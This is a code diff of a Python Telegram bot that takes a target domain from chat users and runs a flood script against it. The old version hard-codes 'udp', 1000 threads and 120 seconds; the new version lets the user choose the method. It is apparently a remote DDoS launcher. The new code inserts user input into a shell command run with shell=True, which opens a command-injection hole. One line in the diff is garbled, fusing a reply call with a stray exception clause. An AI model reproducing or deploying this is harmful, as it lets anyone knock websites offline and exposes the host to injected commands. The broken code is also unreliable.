@@ -8,22 +8,24 @@ bot = telebot.TeleBot(API_TOKEN)
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, "Welcome to the UDP Bot! Use the command /run to start.")
+    bot.reply_to(message, "Welcome to the Command Runner Bot! Use /run to start the process.")
 
 @bot.message_handler(commands=['run'])
 def handle_run(message):
-    msg = bot.reply_to(message, "Please provide the domain.")
-    bot.register_next_step_handler(msg, process_domain)
+    msg = bot.reply_to(message, "Please provide the following inputs separated by a space:\n1. Method\n2. Domain")
+    bot.register_next_step_handler(msg, process_inputs)
 
-def process_domain(message):
+def process_inputs(message):
     try:
-        domain = message.text
-        udp = 'udp'
-        thread = '1000'
-        time = '120'
+        inputs = message.text.split()
+        if len(inputs) != 2:
+            raise ValueError("Invalid number of inputs. Please provide exactly 2 inputs.")
 
-        # Command to be executed
-        command = f"python start.py {udp} {domain} {thread} {time}"
+        method = inputs[0]
+        domain = inputs[1]
+
+        # Construct and execute the command
+        command = f"python setup.py '{method}' '{domain}' 1000 120"
         process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output, error = process.communicate()
 
@@ -33,34 +35,7 @@ def process_domain(message):
             bot.reply_to(message, f"Error executing command:\n{error.decode('utf-8')}")
 
     except Exception as e:
-        bot.reply_to(message, f"Error processing domain: {str(e)}")
-
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    bot.reply_to(message, "Welcome! Use the command /stop followed by the script name to stop a Python program.")
-
-@bot.message_handler(commands=['stop'])
-def handle_stop(message):
-    msg = bot.reply_to(message, "start.py")
-    bot.register_next_step_handler(msg, stop_script)
-
-def stop_script(message):
-    script_name = message.text.strip()
-    stopped = stop_python_program(script_name)
-    if stopped:
-        bot.reply_to(message, f"Script '{script_name}' has been stopped.")
-    else:
-        bot.reply_to(message, f"Could not find or stop script '{script_name}'.")
-
-def stop_python_program(script_name):
-    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
-        try:
-            # Check if process is a Python process and matches the script name
-            if proc.info['name'] == 'python' or proc.info['name'] == 'python3':
-                if len(proc.info['cmdline']) > 1 and script_name in proc.info['cmdline'][1]:
-                    proc.terminate()
-                    return True
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+        bot.reply_to(message, f"Error processing inputs: {str(e)}")        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
             continue
     return False
 
@@ -79,6 +54,20 @@ def handle_run(message):
 
     except Exception as e:
         bot.reply_to(message, f"Error: {str(e)}")
+
+@bot.message_handler(commands=['help'])
+def handle_help(message):
+    try:
+        # Execute the command `python setup.py help`
+        process = subprocess.Popen(['python', 'setup.py', 'help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, error = process.communicate()
+
+        if process.returncode == 0:
+            bot.reply_to(message, f"Command executed successfully:\n{output.decode('utf-8')}")
+        else:
+            bot.reply_to(message, f"Error executing command:\n{error.decode('utf-8')}")
+    except Exception as e:
+        bot.reply_to(message, f"An error occurred: {str(e)}")
         
 
 bot.polling()
